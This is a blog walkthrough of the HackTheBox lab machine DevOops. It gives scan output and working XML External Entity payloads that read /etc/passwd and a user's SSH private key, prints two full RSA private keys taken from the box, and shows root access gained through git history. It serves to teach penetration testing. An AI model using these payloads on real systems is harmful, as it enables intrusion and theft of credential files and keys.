---
layout: post
title:  "How to hack a website throught XML External Entity (XXE) Injection"
description: "Learn pentesting web from 0 with HackTheBox (DevOops)"
date:   2019-04-15
image:  "img/XXE.jpg"
tags:   [Pentesting WEB, Injection XML External Entity, Hacking Linux]
---

Hello Hackers!!  
Today we are going to learn about the XML vulnerability EXTERNAL ENTITY [XXE] and we will perform an intrusion test towards a vulnerable machine available in HackThebox called [DevOops](https://www.hackthebox.eu/home/machines/profile/140).  

Before starting I want to clarify that all my published content is done for educational, informative and ethical purposes.  
I am not responsible for the misuse they may give you.  

XML EXTERNAL ENTITY, refers to a server request forgery attack (SSRF), by which an attacker is capable of causing:  
    - Access to local or remote files and services  
    - Denial of service (DDoS)  

In other words, vulnerability XXE consists of an injection that takes advantage of the misconfiguration of the XML interpreter allowing external entities to be included, this attack is made against an application that interprets XML language in its parameters.  

If you want to know more about this vulnerability, I invite you to read the following official post of OWASP.  
[Article Complete](https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE))  

# With this tutorial you will learn:  
   - How to perform a simple port scan with Nmap.
   - How to perform a directory discovery with dirb.
   - How to intercept and manipulate requests with burpsuite.
   - How to exploit the vulnerability of XML External Entity (XXE)
   - How to connect by SSH with a RSA private key
   - How to obtain sensitive data through GIT
   - Learn about Dumping Git Data from Misconfigured Web Servers

# Hacking [DevOops](https://www.hackthebox.eu/home/machines/profile/140)

As always we will start enumerating our victim, For this we will perform a simple scan with Nmap, in the following way.

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/devoops]─[root@Arthorias]─[0]─[4438]
╰─[:)] # nmap -p- -sV -T5 -oN ./devoops.nmap 10.10.10.91 --open
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-19 02:46 -05
Nmap scan report for 10.10.10.91
Host is up (0.19s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Gunicorn 19.7.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

From Nmap scanning, we have enumerated port 22 and 5000 are only open ports on the target’s network, therefore firstly, let’s navigate to port 5000 through a web browser.  
By exploring the given URL, it puts up following web page as shown in the below image.  

<figure>
  <img src="{{site.baseurl}}/img/Port5000Devoops.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/Port5000Devoops.png" title="Web Page in the port 5000">Web Page in the port 5000</a>.
  </figcaption>
</figure> 

Apparently we do not find anything interesting in the main page, we will continue making a directory discovery on the URL http://10.10.10.91:5000/ with DIRB.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/devoops]─[root@Arthorias]─[255]─[4441]
╰─[:)] # dirb http://10.10.10.91:5000

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Apr 19 02:57:38 2019
URL_BASE: http://10.10.10.91:5000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.91:5000/ ----
+ http://10.10.10.91:5000/feed (CODE:200|SIZE:546263)                                                                                                
+ http://10.10.10.91:5000/upload (CODE:200|SIZE:347)                                                                                                                                                                                                   
-----------------
END_TIME: Fri Apr 19 03:27:18 2019
DOWNLOADED: 4612 - FOUND: 2
{% endhighlight %}  

From the results of DIRB, we managed to identify a URL that allows us to upload XML files.  
**http://10.10.10.91:5000/upload**  


# Exploiting XML External Entity (XXE)  

The following web page lets you upload an XML file, including XML elements Author, Subject and content.   

<figure>
  <img src="{{site.baseurl}}/img/UploadFileDevoops.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/UploadFileDevoops.png" title="Exploiting XML External Entity">Exploiting XML External Entity</a>.
  </figcaption>
</figure> 

For that reason, we have created an XML file with the help of the following code and saved as Attack.xml  

{% highlight xml %}
<?xml version="1.0"?>
  <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >
  ]>
  <feed>
    <Author>Gerh</Author>
    <Subject>BinaryChaos</Subject>
    <Content>&xxe;</Content>
  </feed>
{% endhighlight %}  

Since the system is a Linux system, I’ve requested the **/etc/passwd** file.  
This file will allow us to see what users are on the machine.  
Here is what came back when we uploaded the XML file to the server:  

{% highlight markdown %}
 PROCESSED BLOGPOST: 
  Author: Gerh
 Subject: BinaryChaos
 Content: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
osboxes:x:1000:1000:osboxes.org,,,:/home/osboxes:/bin/false
git:x:1001:1001:git,,,:/home/git:/bin/bash
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
blogfeed:x:1003:1003:,,,:/home/blogfeed:/bin/false

 URL for later reference: /uploads/exploit.xml
 File path: /home/roosa/deploy/src
{% endhighlight %}  
 
As you can see we are visualizing the contents of the file **/etc/passwd**  

To continue we will intercept the requests with Burpsuite and then taking into account that this victim machine is running an SSH server it is very likely to find a private key of some user.  

<figure>
  <img src="{{site.baseurl}}/img/BurpDevoops.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/BurpDevoops.png" title="Intercepting request for exploiting XXE">Intercepting request for exploiting XXE</a>
  </figcaption>
</figure> 

We know we need an SSH private key in order to log in via SSH.  
Private keys are typically stored in the **/home/username/.ssh/id_rsa** file.  
To visualize the content of the user's private key *roosa*, which was identified thanks to the /etc/passwd file, we must create the following malicious file:    

{% highlight xml %}
<?xml version="1.0"?>
  <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >
  ]>
  <feed>
    <Author>Gerh</Author>
    <Subject>BinaryChaos</Subject>
    <Content>&xxe;</Content>
  </feed>
{% endhighlight %}  

After uploading the previous file, the result is as follows:

<figure>
  <img src="{{site.baseurl}}/img/Burp2Devoops.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/Burp2Devoops.png" title="Intercepting request for exploiting XXE">Intercepting request for exploiting XXE</a>
  </figcaption>
</figure> 

## How to connect ssh with private key  

Since we have copied RSA Private KEY in a text file named as “key”, then set permission 600 and try to login with the help of the following command.

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/devoops]─[root@Arthorias]─[0]─[4444]
╰─[:)] # cat > key
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/devoops]─[root@Arthorias]─[0]─[4444]
╰─[:)] # chmod 600 key
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/devoops]─[root@Arthorias]─[0]─[4444]
╰─[:)] # ssh -i key roosa@10.10.10.91
The authenticity of host '10.10.10.91 (10.10.10.91)' can not be established.
ECDSA key fingerprint is SHA256:hbD2D4PdnIVpAFHV8sSAbtM0IlTAIpYZ/nwspIdp4Vg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.91' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

roosa@gitter:~$ 
{% endhighlight %}  

# Privilege Escalation

Roosa has a git directory at /home/roosa/work/blogfeed/.git. It’s usually a good idea to search this folder for previous commits, branches and so forth. As Github repositories have all their changes documented, it’s often possible to find sensible data that was previously “deleted” by the thoughtful developers.  
Running *git log -p* inside the .git folder, we can see logs of previous commits.  
[More about .git dumping](https://blog.netspi.com/dumping-git-data-from-misconfigured-web-servers/)

<figure>
  <img src="{{site.baseurl}}/img/GitLogDevoops.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/GitLogDevoops.png" title="Dumping Git Data from Misconfigured Web Servers">Dumping Git Data from Misconfigured Web Servers</a>
  </figcaption>
</figure> 

And finally, we got the original RSA Key.   
Copy it into the notepad, remove + signs and save it as a root.key file; to then connect by ssh to the machine with the root user.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/devoops]─[root@Arthorias]─[0]─[4454]
╰─[:)] # cat > keyroot 
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----

╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/devoops]─[root@Arthorias]─[255]─[4451]
╰─[:(] # chmod 600 keyroot
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/devoops]─[root@Arthorias]─[255]─[4453]
╰─[:(] # ssh -i keyroot root@10.10.10.91   
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1
root@gitter:~# whoami
root
{% endhighlight %}  
